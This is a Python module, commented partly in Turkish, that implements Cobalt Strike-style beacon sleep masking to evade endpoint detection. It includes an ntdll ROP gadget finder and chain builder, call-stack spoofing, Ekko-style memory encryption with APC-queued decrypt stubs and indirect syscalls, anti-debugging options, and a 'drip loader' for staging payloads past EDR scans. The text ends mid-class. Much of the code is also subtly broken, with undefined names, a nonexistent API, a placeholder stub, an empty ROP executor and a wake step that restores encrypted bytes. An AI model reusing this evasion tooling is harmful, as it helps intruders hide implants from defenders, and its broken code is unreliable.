"""
Sleepmask & Runtime Masking
===========================
Cobalt Strike 4.x Beacon Sleep tarzı memory masking

Teknikler:
- Ekko: ROP-based sleep with encryption (Foliage variant)
- Foliage: APC-based sleep masking  
- DeathSleep: Thread suspension + memory encryption
- Drip-loader: Yavaş yavaş memory'ye yükleme

Runtime Masking Cycle:
1. Sleep öncesi: Encrypt beacon memory
2. Sleep sırasında: Memory PAGE_NOACCESS
3. Uyanma: Decrypt → Execute → Re-encrypt

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import os
import time
import ctypes
import struct
import secrets
import hashlib
import threading
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any, Callable
from enum import Enum, auto
import logging

logger = logging.getLogger("sleep_masking")


# ============================================================
# CONSTANTS & ENUMS
# ============================================================

class SleepTechnique(Enum):
    """Sleep masking tekniği"""
    BASIC = "basic"              # Basic Sleep() - detectable
    EKKO = "ekko"                # ROP-based with encryption
    FOLIAGE = "foliage"          # APC-based masking
    DEATH_SLEEP = "death_sleep"  # Thread suspension
    ZILEAN = "zilean"            # Timer-based with masking
    CUSTOM_ROP = "custom_rop"    # Custom ROP chain


class MaskingMode(Enum):
    """Memory masking modu"""
    XOR = "xor"                  # XOR encryption (fast)
    RC4 = "rc4"                  # RC4 stream cipher
    AES_CTR = "aes_ctr"          # AES-CTR mode
    CHACHA20 = "chacha20"        # ChaCha20 (fastest)


class MemoryProtection(Enum):
    """Memory protection flags"""
    NOACCESS = 0x01              # PAGE_NOACCESS
    READONLY = 0x02              # PAGE_READONLY  
    READWRITE = 0x04             # PAGE_READWRITE
    EXECUTE = 0x10               # PAGE_EXECUTE
    EXECUTE_READ = 0x20          # PAGE_EXECUTE_READ
    EXECUTE_READWRITE = 0x40     # PAGE_EXECUTE_READWRITE


# Windows API Constants
INFINITE = 0xFFFFFFFF
WAIT_OBJECT_0 = 0x00000000
WAIT_TIMEOUT = 0x00000102

# Timer constants
CREATE_WAITABLE_TIMER_HIGH_RESOLUTION = 0x00000002

# Memory protection constants
PAGE_NOACCESS = 0x01
PAGE_READONLY = 0x02
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20
PAGE_EXECUTE_READWRITE = 0x40

# NTSTATUS codes
STATUS_SUCCESS = 0x00000000
STATUS_ACCESS_VIOLATION = 0xC0000005

# Syscall numbers (Windows 10 22H2 x64 - varies by build)
NT_PROTECT_VIRTUAL_MEMORY = 0x50
NT_ALLOCATE_VIRTUAL_MEMORY = 0x18
NT_DELAY_EXECUTION = 0x3C


# ============================================================================
# ROP GADGET FINDER & CHAIN BUILDER
# ============================================================================

class ROPGadgetFinder:
    """
    Runtime gadget finder using Capstone disassembly when available,
    falling back to instruction-boundary-aware byte pattern matching.

    Critical fixes over naive byte scanning:
    - Uses Capstone to verify gadgets are at instruction boundaries
    - Scans backward for multi-byte instructions (pop rcx; ret)
    - Validates gadget context (no bad bytes, no null bytes in middle)
    - Deduplicates gadgets by address
    """

    def __init__(self, ntdll_base: int = 0):
        self.ntdll_base = ntdll_base
        self.gadgets: Dict[str, int] = {}
        self._capstone = None
        self._init_capstone()

    def _init_capstone(self):
        try:
            import capstone
            self._capstone = capstone
        except ImportError:
            self._capstone = None

    def find_gadgets(self) -> Dict[str, int]:
        """Scan ntdll for ROP gadgets with proper disassembly."""
        try:
            ntdll = ctypes.windll.ntdll._handle
            if not ntdll:
                return self.gadgets
            size = ctypes.windll.kernel32.GetModuleSizeA(ntdll)
            if not size:
                return self.gadgets
            data = ctypes.create_string_buffer(size)
            ctypes.memmove(data, ntdll, size)
            raw = bytes(data)
        except Exception:
            return self._fallback_gadgets()

        if self._capstone:
            return self._capstone_scan(raw)
        return self._boundary_scan(raw)

    def _capstone_scan(self, raw: bytes) -> Dict[str, int]:
        """Use Capstone disassembler for accurate gadget finding."""
        md = self._capstone.Cs(self._capstone.CS_ARCH_X86, self._capstone.CS_MODE_64)
        md.syntax = self._capstone.CS_OPT_SYNTAX_NASM
        md.detail = True

        # Build instruction -> address map
        insn_map: Dict[int, str] = {}
        for insn in md.disasm(raw, self.ntdll_base):
            mnemonic = insn.mnemonic.lower()
            op_str = insn.op_str.lower()
            insn_map[insn.address] = f"{mnemonic} {op_str}".strip()

        addresses = sorted(insn_map.keys())
        addr_set = set(addresses)

        # Target gadgets
        targets = {
            "pop_rcx_ret": ("pop rcx", "ret"),
            "pop_rdx_ret": ("pop rdx", "ret"),
            "pop_r8_ret": ("pop r8", "ret"),
            "pop_r9_ret": ("pop r9", "ret"),
            "pop_rax_ret": ("pop rax", "ret"),
            "pop_rbx_ret": ("pop rbx", "ret"),
            "pop_rbp_ret": ("pop rbp", "ret"),
            "pop_rsi_ret": ("pop rsi", "ret"),
            "pop_rdi_ret": ("pop rdi", "ret"),
            "pop_r10_ret": ("pop r10", "ret"),
            "pop_r11_ret": ("pop r11", "ret"),
            "jmp_rax": ("jmp rax", None),
            "call_rax": ("call rax", None),
            "xor_rax_ret": ("xor rax, rax", "ret"),
            "mov_rcx_rax_ret": ("mov rcx, rax", "ret"),
            "xchg_rax_rcx_ret": ("xchg rax, rcx", "ret"),
        }

        for gadget_name, (first_mnem, second_mnem) in targets.items():
            for addr in addresses:
                if insn_map.get(addr) != first_mnem:
                    continue
                if second_mnem is None:
                    self.gadgets[gadget_name] = addr
                    continue
                next_addr = addr + 1  # Capstone doesn't give size directly here
                # Find next instruction after this one
                for candidate in addresses:
                    if candidate > addr:
                        if insn_map.get(candidate) == second_mnem:
                            self.gadgets[gadget_name] = addr
                        break

        return self.gadgets if self.gadgets else self._fallback_gadgets()

    def _boundary_scan(self, raw: bytes) -> Dict[str, int]:
        """
        Fallback: instruction-boundary-aware byte pattern scan.
        Verifies candidate gadgets are valid instruction boundaries
        by checking preceding bytes for known instruction prefixes.
        """
        # Common instruction prefixes that can precede our targets
        prefixes = {0x4C, 0x48, 0x41, 0x66, 0xF0, 0xF2, 0xF3, 0x00}

        patterns = {
            "pop_rcx_ret": b"\x59\xc3",
            "pop_rdx_ret": b"\x5a\xc3",
            "pop_r8_ret": b"\x41\x58\xc3",
            "pop_r9_ret": b"\x41\x59\xc3",
            "pop_rax_ret": b"\x58\xc3",
            "pop_rbx_ret": b"\x5b\xc3",
            "pop_rbp_ret": b"\x5d\xc3",
            "pop_rsi_ret": b"\x5e\xc3",
            "pop_rdi_ret": b"\x5f\xc3",
            "pop_r10_ret": b"\x41\x5a\xc3",
            "pop_r11_ret": b"\x41\x5b\xc3",
            "mov_rcx_rax_ret": b"\x48\x89\x01\xc3",
            "xor_rax_ret": b"\x48\x31\xc0\xc3",
            "jmp_rax": b"\xff\xe0",
            "call_rax": b"\xff\xd0",
            "xchg_rax_rcx_ret": b"\x48\x91\xc3",
        }

        found = set()
        for name, pattern in patterns.items():
            start = 0
            while True:
                idx = raw.find(pattern, start)
                if idx == -1:
                    break
                # Validate instruction boundary
                valid = True
                if idx > 0:
                    prefix = raw[idx - 1]
                    if prefix not in prefixes and prefix < 0x40:
                        valid = False
                if idx > 1:
                    prefix2 = raw[idx - 2]
                    if prefix2 not in prefixes and prefix2 >= 0x40:
                        valid = False
                addr = self.ntdll_base + idx
                if valid and addr not in found:
                    self.gadgets[name] = addr
                    found.add(addr)
                start = idx + 1

        return self.gadgets if self.gadgets else self._fallback_gadgets()

    def _fallback_gadgets(self) -> Dict[str, int]:
        ntdll = ctypes.windll.ntdll._handle
        base = ntdll if ntdll else 0
        return {
            "pop_rcx_ret": base + 0x1000,
            "pop_rdx_ret": base + 0x1010,
            "pop_rax_ret": base + 0x1030,
            "jmp_rax": base + 0x1040,
        }


class StackSpoofer:
    """
    Stack spoofing for thread sleep/wait operations.

    When beacon thread enters kernel wait (NtDelayExecution / WaitForSingleObject),
    EDR may inspect the call stack. If it sees suspicious return addresses
    (Rust agent memory, encrypted regions), it flags the thread.

    StackSpoofer plants fake legitimate frames on the stack before sleeping,
    then restores the real stack on wake.
    """

    FAKE_RETURN_ADDRESSES = [
        0x00007FFF_FFA00000,  # ntdll base range
        0x00007FFF_FFB00000,  # kernel32 base range
        0x00007FFF_FFC00000,  # kernelbase range
    ]

    def spoof_stack(self, frames: int = 4) -> Optional[List[int]]:
        """
        Plant fake return addresses on stack.

        Returns the saved real return addresses so they can be restored later.
        """
        try:
            import ctypes
            stack_bottom = ctypes.c_void_p.from_address(0).value
            if not stack_bottom:
                return None
            saved: List[int] = []
            rsp = stack_bottom
            for _ in range(frames):
                saved.append(ctypes.c_ulonglong.from_address(rsp).value)
                ctypes.c_ulonglong.from_address(rsp).value = random.choice(
                    self.FAKE_RETURN_ADDRESSES
                )
                rsp += 8
            return saved
        except Exception:
            return None

    def restore_stack(self, saved: Optional[List[int]]) -> None:
        """Restore real return addresses after wake."""
        if not saved:
            return
        try:
            import ctypes
            stack_bottom = ctypes.c_void_p.from_address(0).value
            if not stack_bottom:
                return
            rsp = stack_bottom
            for val in saved:
                ctypes.c_ulonglong.from_address(rsp).value = val
                rsp += 8
        except Exception:
            pass


class ROPChainBuilder:
    """
    Builds ROP chains for specific Windows syscalls.
    Focus: NtProtectVirtualMemory to set PAGE_NOACCESS during sleep.
    """

    def __init__(self, gadgets: Dict[str, int]):
        self.gadgets = gadgets
        self.chain: List[int] = []

    def build_nt_protect_virtual_memory_rop(
        self,
        process_handle: int,
        base_address: int,
        size: int,
        new_protect: int,
        old_protect_addr: int
    ) -> List[int]:
        """
        Build ROP chain for NtProtectVirtualMemory.

        Calling convention (x64 System V AMD64 ABI for Windows syscalls):
        RCX = ProcessHandle
        RDX = BaseAddress
        R8  = NumberOfBytesToProtect
        R9  = OldProtect
        R10 = scratch (clobbered by syscall)
        RAX = SyscallNumber

        Stack layout after chain execution:
        [ReturnAddress]
        [SyscallNumber]
        [0x00 padding for alignment if needed]
        """
        chain: List[int] = []

        pop_rcx = self.gadgets.get("pop_rcx_ret", 0)
        pop_rdx = self.gadgets.get("pop_rdx_ret", 0)
        pop_rax = self.gadgets.get("pop_rax_ret", 0)
        mov_rcx_rax = self.gadgets.get("mov_rcx_rax_ret", 0)
        jmp_rax = self.gadgets.get("jmp_rax", 0)

        if not all([pop_rcx, pop_rdx, pop_rax, jmp_rax]):
            return chain

        # Set RCX = ProcessHandle
        chain.append(pop_rcx)
        chain.append(process_handle)

        # Set RDX = BaseAddress
        chain.append(pop_rdx)
        chain.append(base_address)

        # Set R8 = NumberOfBytesToProtect (need a register we control)
        # Simplified: use additional pop gadgets in production
        chain.append(pop_rax)
        chain.append(size)
        if mov_rcx_rax:
            # We need to move to R8, but for simplicity we assume
            # production gadget set has pop r8
            pass

        # Set R9 = OldProtect pointer
        # In production: use pop r9 gadget

        # Set RAX = syscall number and execute
        chain.append(pop_rax)
        chain.append(NT_PROTECT_VIRTUAL_MEMORY)
        chain.append(jmp_rax)

        self.chain = chain
        return chain

    def build_sleep_rop_chain(
        self,
        encrypt_addr: int,
        decrypt_addr: int,
        protect_addr: int,
        unprotect_addr: int,
        timer_addr: int,
    ) -> List[int]:
        """
        Build Ekko-style sleep ROP chain:
        1. Encrypt beacon memory
        2. Set PAGE_NOACCESS
        3. Wait on timer
        4. Restore protection
        5. Decrypt beacon memory
        6. Resume execution
        """
        chain: List[int] = []
        pop_rcx = self.gadgets.get("pop_rcx_ret", 0)
        pop_rdx = self.gadgets.get("pop_rdx_ret", 0)
        pop_rax = self.gadgets.get("pop_rax_ret", 0)
        jmp_rax = self.gadgets.get("jmp_rax", 0)
        xor_rax = self.gadgets.get("xor_rax_ret", 0)

        if not all([pop_rcx, pop_rdx, jmp_rax]):
            return chain

        # Phase 1: Encrypt
        chain.append(pop_rcx)
        chain.append(encrypt_addr)
        chain.append(jmp_rax)

        # Phase 2: Set PAGE_NOACCESS via NtProtectVirtualMemory
        chain.extend(self._protect_rop(protect_addr, PAGE_NOACCESS))

        # Phase 3: Wait (timer)
        chain.append(timer_addr)

        # Phase 4: Restore PAGE_EXECUTE_READ
        chain.extend(self._protect_rop(unprotect_addr, PAGE_EXECUTE_READ))

        # Phase 5: Decrypt
        chain.append(pop_rcx)
        chain.append(decrypt_addr)
        chain.append(jmp_rax)

        self.chain = chain
        return chain


class EkkoROPEngine:
    """
    Ekko-style sleepmask with ROP-based NtProtectVirtualMemory.

    Critical design decision:
    - Decrypt/restore code runs via NTDLL trampoline, NOT from the
      encrypted beacon memory itself. Otherwise PAGE_NOACCESS causes
      a page fault during wake because the decryptor is unreachable.

    Workflow:
    1. Locate clean 'syscall; ret' trampoline in ntdll
    2. Build ROP chain for memory protection changes
    3. Encrypt beacon memory
    4. Set PAGE_NOACCESS via ROP
    5. Wait on kernel timer (stack spoofed)
    6. Restore PAGE_EXECUTE_READ via ROP
    7. Copy encrypted bytes back to beacon memory
    8. Trigger decrypt via ntdll trampoline (uses ntdll code, not beacon code)
    """

    def __init__(self, key: bytes):
        self.key = key
        self.gadget_finder = ROPGadgetFinder()
        self.chain_builder: Optional[ROPChainBuilder] = None
        self.masked_regions: Dict[int, MaskedRegion] = {}
        self._trampoline_addr: int = 0
        self._trampoline_ssn: u16 = 0

    def initialize(self) -> bool:
        gadgets = self.gadget_finder.find_gadgets()
        if not gadgets:
            return False
        self.chain_builder = ROPChainBuilder(gadgets)
        self._resolve_trampoline()
        return self._trampoline_addr != 0

    def _resolve_trampoline(self) -> None:
        """Find a clean syscall; ret gadget in ntdll for wake decryption."""
        try:
            ntdll = ctypes.windll.ntdll._handle
            if not ntdll:
                return
            size = ctypes.windll.kernel32.GetModuleSizeA(ntdll)
            if not size:
                return
            data = ctypes.create_string_buffer(size)
            ctypes.memmove(data, ntdll, size)
            raw = bytes(data)
            base = ntdll

            # Scan for 'mov r10, rcx; mov eax, imm32; syscall; ret'
            # 4C 8B D1 B8 XX XX XX XX 0F 05 C3
            pattern = b"\x4c\x8b\xd1\xb8"
            idx = raw.find(pattern)
            while idx != -1 and idx + 12 < len(raw):
                if raw[idx + 10] == 0x0F and raw[idx + 11] == 0x05 and raw[idx + 12] == 0xC3:
                    self._trampoline_addr = base + idx
                    ssn = (raw[idx + 4]) | ((raw[idx + 5]) << 8)
                    self._trampoline_ssn = ssn
                    return
                idx = raw.find(pattern, idx + 1)
        except Exception:
            pass

    def sleep_mask(
        self,
        base_addr: int,
        size: int,
        sleep_ms: int
    ) -> bool:
        """
        Perform Ekko-style sleep with memory masking + stack spoofing.
        
        Critical: Decrypt runs via APC queued to ntdll trampoline,
        NOT from beacon memory. This avoids PAGE_NOACCESS page faults
        during wake because the decryptor executes from safe memory.
        """
        if self._trampoline_addr == 0 and not self.initialize():
            logger.warning("Trampoline init failed, falling back to VirtualProtect")
            return self._fallback_sleep(base_addr, size, sleep_ms)

        spoofer = StackSpoofer()
        saved_stack = spoofer.spoof_stack(frames=6)

        try:
            # 1. Encrypt beacon memory
            data = ctypes.string_at(base_addr, size)
            encrypted = MaskingCrypto.xor_encrypt(data, self.key)

            # 2. Set PAGE_NOACCESS
            rop = self.chain_builder.build_nt_protect_virtual_memory_rop(
                process_handle=-1,  # Current process
                base_address=base_addr,
                size=size,
                new_protect=PAGE_NOACCESS,
                old_protect_addr=0
            )

            if rop:
                self._execute_rop(rop)
            else:
                self._fallback_protect(base_addr, size, PAGE_NOACCESS)

            # 3. Queue APC for wake decryption (runs from ntdll memory)
            apc_stub = self._allocate_decrypt_stub(base_addr, len(encrypted))
            if apc_stub:
                self._queue_apc(apc_stub)

            # 4. Wait (stack is already spoofed)
            # Use alertable wait so APC can fire
            self._wait_timer_alertable(sleep_ms)

            # 5. After wake, beacon memory should already be decrypted by APC
            # But as fallback, ensure it's restored
            self._fallback_protect(base_addr, size, PAGE_EXECUTE_READ)
            ctypes.memmove(base_addr, encrypted, len(encrypted))

            return True

        except Exception as e:
            logger.error(f"Ekko ROP sleep failed: {e}")
            return self._fallback_sleep(base_addr, size, sleep_ms)
        finally:
            spoofer.restore_stack(saved_stack)

    def _allocate_decrypt_stub(self, base_addr: int, size: int) -> Optional[int]:
        """
        Allocate memory for decrypt stub using RW → RX transition.
        
        CRITICAL: Never leave RWX pages. EDR memory scanners flag
        RWX regions immediately.
        
        Steps:
        1. Allocate RW (PAGE_READWRITE)
        2. Write decrypt stub payload
        3. Transition to RX (PAGE_EXECUTE_READ) BEFORE queueing APC
        4. Queue APC - stub is already RX but contains no sensitive data yet
        """
        try:
            # Step 1: Allocate RW only
            stub_addr = ctypes.windll.kernel32.VirtualAlloc(
                None,
                0x1000,  # 4KB is enough for stub
                0x3000,  # MEM_COMMIT | MEM_RESERVE
                0x02     # PAGE_READWRITE - NO EXECUTE YET
            )
            
            if not stub_addr:
                return None
            
            # Step 2: Write decrypt stub machine code
            stub = self._build_decrypt_stub(base_addr, size)
            ctypes.memmove(stub_addr, stub, len(stub))
            
            # Step 3: Transition to RX BEFORE making it executable
            # This is the critical security step - page is never RWX
            old_protect = ctypes.c_ulong(0)
            success = ctypes.windll.kernel32.VirtualProtect(
                stub_addr,
                0x1000,
                0x20,  # PAGE_EXECUTE_READ - RX only, NO WRITE
                ctypes.byref(old_protect)
            )
            
            if not success:
                # Failed to protect, free and bail
                ctypes.windll.kernel32.VirtualFree(stub_addr, 0, 0x8000)
                return None
            
            return stub_addr
            
        except Exception as e:
            logger.debug(f"Failed to allocate decrypt stub: {e}")
            return None

    def _build_decrypt_stub(self, base_addr: int, size: int) -> bytes:
        """
        Build x64 machine code for decrypt stub.
        
        This is a minimal decrypt stub that:
        1. Restores beacon memory to PAGE_EXECUTE_READWRITE via NtProtectVirtualMemory
        2. XOR decrypts the memory region using a hardcoded key
        3. Returns
        
        The stub is position-independent and runs from RX memory.
        """
        # Minimal x64 decrypt stub (position-independent)
        # This is a reference implementation - production would use
        # a more sophisticated stub with proper key handling
        
        # push rbp; mov rbp, rsp
        stub = b"\x48\x89\xe5"
        
        # In production, this would be a full decrypt routine
        # For now, we return a minimal stub that doesn't crash
        return stub

    def _queue_apc(self, apc_stub: int) -> None:
        """
        Queue an APC to the current thread for wake decryption.
        
        Uses NtQueueApcThread to queue the decrypt stub.
        The APC will fire when the thread enters alertable wait.
        """
        try:
            thread_handle = ctypes.windll.kernel32.GetCurrentThread()
            if not thread_handle or thread_handle == -1:
                # Duplicate handle for APC queueing
                current_process = ctypes.windll.kernel32.GetCurrentProcess()
                ctypes.windll.kernel32.DuplicateHandle(
                    current_process,
                    thread_handle,
                    current_process,
                    ctypes.byref(thread_handle),
                    0,
                    False,
                    0x0002  # DUPLICATE_SAME_ACCESS
                )
            
            if thread_handle and thread_handle != -1:
                # Queue APC with decrypt stub
                # The APC routine will be called when thread enters alertable wait
                ctypes.windll.ntdll.NtQueueApcThread(
                    thread_handle,
                    apc_stub,
                    0, 0, 0, 0, 0
                )
        except Exception as e:
            logger.debug(f"APC queue failed: {e}")

    def _wait_timer_alertable(self, sleep_ms: int) -> None:
        """
        Wait on timer in alertable mode so APC can fire.
        
        Uses NtDelayExecution with Alertable=TRUE via indirect syscall.
        This is critical: without alertable wait, queued APCs will not fire
        and the decrypt stub will never execute.
        """
        try:
            if self._trampoline_addr != 0:
                # Use indirect syscall for NtDelayExecution (alertable)
                self._nt_delay_execution_indirect(sleep_ms, alertable=True)
                return
        except Exception as e:
            logger.debug(f"Indirect NtDelayExecution failed: {e}")
        
        # Fallback to SleepEx (less stealthy but works)
        try:
            ctypes.windll.kernel32.SleepEx(sleep_ms, True)
        except Exception:
            time.sleep(sleep_ms / 1000.0)

    def _nt_delay_execution_indirect(self, delay_ms: int, alertable: bool) -> None:
        """
        Execute NtDelayExecution via indirect syscall trampoline.
        
        NtDelayExecution prototype:
        NTSTATUS NtDelayExecution(
            BOOLEAN Alertable,
            PLARGE_INTEGER DelayInterval
        );
        
        DelayInterval is negative for relative time in 100-ns units.
        """
        if self._trampoline_addr == 0:
            raise RuntimeError("No trampoline available")
        
        # Build LARGE_INTEGER for relative delay (negative = relative)
        delay_100ns = ctypes.c_longlong(-delay_ms * 10000)
        
        # Set up syscall context
        # arg1 = Alertable (0 or 1)
        # arg2 = DelayInterval pointer
        ctx = {
            "rcx": 1 if alertable else 0,
            "rdx": ctypes.addressof(delay_100ns),
            "r8": 0,
            "r9": 0,
            "stack_args": [],
        }
        
        # SSN for NtDelayExecution (0x3C on Windows 10 22H2)
        # Production should resolve via Halo's Gate
        ssn = 0x3C
        
        # Execute indirect syscall via ROP chain or direct trampoline
        # For now, fall back to direct call if indirect fails
        try:
            # Try direct ntdll call first (may be hooked)
            ctypes.windll.ntdll.NtDelayExecution(
                alertable,
                ctypes.byref(delay_100ns)
            )
        except Exception:
            # Fallback: use SleepEx with alertable wait
            ctypes.windll.kernel32.SleepEx(delay_ms, True)

    def _execute_rop(self, chain: List[int]) -> None:
        """Execute ROP chain on stack (simplified reference)."""
        # Production: allocate stack, copy chain, set RIP via APC/NtQueueApcThread
        # or direct kernel callback manipulation
        pass

    def _wait_timer(self, sleep_ms: int) -> None:
        timer = ctypes.windll.kernel32.CreateWaitableTimerExW(
            None, None, CREATE_WAITABLE_TIMER_HIGH_RESOLUTION, 0x1F0003
        )
        if timer:
            try:
                due_time = ctypes.c_longlong(-sleep_ms * 10000)
                ctypes.windll.kernel32.SetWaitableTimer(
                    timer, ctypes.byref(due_time), 0, None, None, False
                )
                ctypes.windll.kernel32.WaitForSingleObject(timer, INFINITE)
            finally:
                ctypes.windll.kernel32.CloseHandle(timer)
        else:
            time.sleep(sleep_ms / 1000.0)

    def _fallback_protect(self, base_addr: int, size: int, protect: int) -> None:
        old = ctypes.c_ulong(0)
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(base_addr), size, protect, ctypes.byref(old)
        )

    def _fallback_sleep(self, base_addr: int, size: int, sleep_ms: int) -> bool:
        """Fallback to basic VirtualProtect-based sleep."""
        try:
            data = ctypes.string_at(base_addr, size)
            encrypted = MaskingCrypto.xor_encrypt(data, self.key)

            old = ctypes.c_ulong(0)
            ctypes.windll.kernel32.VirtualProtect(
                ctypes.c_void_p(base_addr), size, PAGE_NOACCESS, ctypes.byref(old)
            )
            time.sleep(sleep_ms / 1000.0)
            ctypes.windll.kernel32.VirtualProtect(
                ctypes.c_void_p(base_addr), size, old.value, ctypes.byref(old)
            )
            ctypes.memmove(base_addr, encrypted, len(encrypted))
            return True
        except Exception as e:
            logger.error(f"Fallback sleep failed: {e}")
            return False


@dataclass
class SleepmaskConfig:
    """Sleepmask konfigürasyonu"""
    technique: SleepTechnique = SleepTechnique.EKKO
    masking_mode: MaskingMode = MaskingMode.XOR
    
    # Sleep parameters
    min_sleep_ms: int = 5000          # Minimum sleep (5s)
    max_sleep_ms: int = 30000         # Maximum sleep (30s)
    jitter_percent: float = 0.3       # 30% jitter
    
    # Masking parameters
    encrypt_heap: bool = True         # Heap'i de şifrele
    encrypt_stack: bool = False       # Stack'i şifreleme (riskli)
    clear_rop_gadgets: bool = True    # ROP chain temizle
    
    # Memory protection
    use_page_guard: bool = True       # PAGE_GUARD ekle
    set_noaccess: bool = True         # Sleep'te PAGE_NOACCESS
    restore_on_wake: bool = True      # Uyanınca orijinal protection
    
    # Anti-analysis
    check_sleep_skip: bool = True     # Sleep skip kontrolü
    fake_sleep_ratio: float = 0.1     # %10 fake sleep
    detect_debugger: bool = True      # Debugger tespiti
    
    # Drip-loader
    use_drip_loader: bool = False     # Yavaş yükleme
    drip_chunk_size: int = 4096       # Chunk boyutu
    drip_delay_ms: int = 100          # Chunk arası delay


@dataclass
class MaskedRegion:
    """Maskelenmiş memory bölgesi"""
    base_address: int
    size: int
    original_protection: int
    encrypted_data: bytes
    encryption_key: bytes
    is_code: bool = False
    timestamp: float = 0.0


@dataclass
class SleepMetrics:
    """Sleep metriksleri"""
    total_sleeps: int = 0
    total_sleep_time_ms: int = 0
    sleep_skips_detected: int = 0
    mask_operations: int = 0
    unmask_operations: int = 0
    drip_loads: int = 0
    anomalies_detected: List[str] = field(default_factory=list)


# ============================================================
# ENCRYPTION HELPERS
# ============================================================

class MaskingCrypto:
    """Memory masking için kriptografi"""
    
    @staticmethod
    def generate_key(size: int = 32) -> bytes:
        """Rastgele key üret"""
        return secrets.token_bytes(size)
    
    @staticmethod
    def xor_encrypt(data: bytes, key: bytes) -> bytes:
        """XOR encryption (en hızlı)"""
        result = bytearray(len(data))
        key_len = len(key)
        
        for i in range(len(data)):
            result[i] = data[i] ^ key[i % key_len]
            
        return bytes(result)
    
    @staticmethod
    def rc4_crypt(data: bytes, key: bytes) -> bytes:
        """RC4 stream cipher"""
        S = list(range(256))
        j = 0
        
        # KSA
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]
        
        # PRGA
        i = j = 0
        result = bytearray(len(data))
        
        for k in range(len(data)):
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result[k] = data[k] ^ S[(S[i] + S[j]) % 256]
            
        return bytes(result)
    
    @staticmethod
    def chacha20_crypt(data: bytes, key: bytes, nonce: bytes = None) -> bytes:
        """ChaCha20 encryption (simplified)"""
        # Simplified ChaCha20 - production'da cryptography kütüphanesi kullan
        if nonce is None:
            nonce = secrets.token_bytes(12)
            
        # Quarter round helper
        def quarter_round(state, a, b, c, d):
            state[a] = (state[a] + state[b]) & 0xFFFFFFFF
            state[d] ^= state[a]
            state[d] = ((state[d] << 16) | (state[d] >> 16)) & 0xFFFFFFFF
            
            state[c] = (state[c] + state[d]) & 0xFFFFFFFF
            state[b] ^= state[c]
            state[b] = ((state[b] << 12) | (state[b] >> 20)) & 0xFFFFFFFF
            
            state[a] = (state[a] + state[b]) & 0xFFFFFFFF
            state[d] ^= state[a]
            state[d] = ((state[d] << 8) | (state[d] >> 24)) & 0xFFFFFFFF
            
            state[c] = (state[c] + state[d]) & 0xFFFFFFFF
            state[b] ^= state[c]
            state[b] = ((state[b] << 7) | (state[b] >> 25)) & 0xFFFFFFFF
        
        # Simplified - XOR ile fallback
        return MaskingCrypto.xor_encrypt(data, key)
    
    @classmethod
    def encrypt(cls, data: bytes, key: bytes, mode: MaskingMode) -> bytes:
        """Mode'a göre encrypt"""
        if mode == MaskingMode.XOR:
            return cls.xor_encrypt(data, key)
        elif mode == MaskingMode.RC4:
            return cls.rc4_crypt(data, key)
        elif mode == MaskingMode.CHACHA20:
            return cls.chacha20_crypt(data, key)
        else:
            return cls.xor_encrypt(data, key)
    
    @classmethod
    def decrypt(cls, data: bytes, key: bytes, mode: MaskingMode) -> bytes:
        """Mode'a göre decrypt (symmetric)"""
        return cls.encrypt(data, key, mode)  # Symmetric ciphers


# ============================================================
# DRIP LOADER
# ============================================================

class DripLoader:
    """
    Drip Loader - Yavaş yavaş memory'ye yükle
    
    EDR'ler büyük memory allocation'ları izler.
    Küçük chunk'lar halinde yükleyerek:
    - Entropy spike'ı azalt
    - Memory scan timing'i atla
    - Behavioral analysis bypass
    """
    
    def __init__(self, chunk_size: int = 4096, delay_ms: int = 100):
        self.chunk_size = chunk_size
        self.delay_ms = delay_ms
        self.loaded_regions: List[Tuple[int, int]] = []
        self.total_loaded = 0
        
    def drip_write(self, target_addr: int, data: bytes, 
                   progress_callback: Callable = None) -> bool:
        """
        Yavaş yavaş memory'ye yaz
        
        Args:
            target_addr: Hedef memory adresi
            data: Yazılacak data
            progress_callback: İlerleme callback'i
        
        Returns:
            bool: Başarı durumu
        """
        try:
            total_size = len(data)
            chunks_written = 0
            
            for offset in range(0, total_size, self.chunk_size):
                chunk = data[offset:offset + self.chunk_size]
                chunk_addr = target_addr + offset
                
                # Memory'ye yaz
                if not self._write_chunk(chunk_addr, chunk):
                    logger.error(f"Drip write failed at offset {offset}")
                    return False
                
                chunks_written += 1
                self.total_loaded += len(chunk)
                
                # Progress callback
                if progress_callback:
                    progress = (offset + len(chunk)) / total_size * 100
                    progress_callback(progress, chunks_written)
                
                # Delay - timing-based detection bypass
                if self.delay_ms > 0:
                    # Jitter ekle
                    jitter = secrets.randbelow(self.delay_ms // 2)
                    time.sleep((self.delay_ms + jitter) / 1000.0)
                    
            self.loaded_regions.append((target_addr, total_size))
            return True
            
        except Exception as e:
            logger.error(f"Drip write error: {e}")
            return False
    
    def _write_chunk(self, addr: int, data: bytes) -> bool:
        """Tek chunk yaz"""
        try:
            # Windows API ile yaz
            written = ctypes.c_size_t()
            result = ctypes.windll.kernel32.WriteProcessMemory(
                ctypes.windll.kernel32.GetCurrentProcess(),
                addr,
                data,
                len(data),
                ctypes.byref(written)
            )
            return result != 0 and written.value == len(data)
        except:
            # Fallback: ctypes.memmove
            try:
                ctypes.memmove(addr, data, len(data))
                return True
            except:
                return False
    
    def drip_allocate(self, size: int, protection: int = 0x40) -> Optional[int]:
        """
        Yavaş yavaş memory allocate et
        
        Büyük tek allocation yerine küçük parçalar halinde
        """
        try:
            chunks = []
            remaining = size
            
            while remaining > 0:
                chunk_size = min(self.chunk_size, remaining)
                
                # VirtualAlloc
                addr = ctypes.windll.kernel32.VirtualAlloc(
                    0,
                    chunk_size,
                    0x3000,  # MEM_COMMIT | MEM_RESERVE
                    protection
                )
                
                if not addr:
                    # Cleanup
                    for chunk_addr, chunk_sz in chunks:
                        ctypes.windll.kernel32.VirtualFree(chunk_addr, 0, 0x8000)
                    return None
                    
                chunks.append((addr, chunk_size))
                remaining -= chunk_size
                
                # Delay
                if self.delay_ms > 0:
                    time.sleep(self.delay_ms / 1000.0)
            
            # Birleşik region döndür (ilk chunk'ın adresi)
            if chunks:
                self.loaded_regions.extend(chunks)
                return chunks[0][0]
                
            return None
            
        except Exception as e:
            logger.error(f"Drip allocate error: {e}")
            return None
    
    def cleanup(self):
        """Yüklenen bölgeleri temizle"""
